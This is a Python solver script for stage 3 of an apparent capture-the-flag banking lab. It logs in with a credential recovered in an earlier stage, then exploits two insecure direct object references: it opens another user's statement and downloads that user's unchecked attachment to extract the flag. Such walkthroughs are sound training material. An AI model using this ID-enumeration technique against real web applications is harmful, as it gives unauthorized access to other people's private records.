#!/usr/bin/env python3
"""
solve_stage3.py - intended-path solver for Stage 3 (IDOR). Standard library only.

    python solve_stage3.py http://localhost:8082

Steps (what a player does in the browser):
  1. Log in with the credentials recovered in Stage 2   (dwijesekara / Ledger#2291)
  2. Open own statement -> its note points at statement 5042 (Compliance follow-up)
  3. IDOR #1: open /statement/5042 (belongs to someone else, server never checks)
  4. It lists an attachment -> IDOR #2: download /files/<id> (also unchecked)
  5. The evidence file contains the flag
"""
import http.cookiejar
import re
import sys
import urllib.parse
import urllib.request


def main(base):
    jar = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    get = lambda p: op.open(base + p).read().decode()

    data = urllib.parse.urlencode({"username": "dwijesekara", "password": "Ledger#2291"}).encode()
    page = op.open(base + "/login", data).read().decode()
    assert "My statements" in page, "login failed (is Stage 2's credential correct?)"
    print("[1] logged in as dwijesekara")

    own = re.findall(r"/statement/(\d+)", page)
    print(f"[2] own statements: {own}")
    note = get(f"/statement/{own[0]}")
    ref = re.search(r"statement (\d+)", note).group(1)
    print(f"    own note points at statement {ref}")

    other = get(f"/statement/{ref}")
    owner = re.search(r"Prepared by ([^<]+)<", other).group(1)
    print(f"[3] IDOR #1: /statement/{ref} belongs to: {owner}")

    fid = re.search(r"/files/(\d+)", other).group(1)
    body = get(f"/files/{fid}")
    print(f"[4] IDOR #2: /files/{fid} downloaded ({len(body)} bytes)")

    flag = re.search(r"CASE\{[^}]+\}", body).group(0)
    print(f"[5] FLAG: {flag}")
    return flag


if __name__ == "__main__":
    main(sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8082")
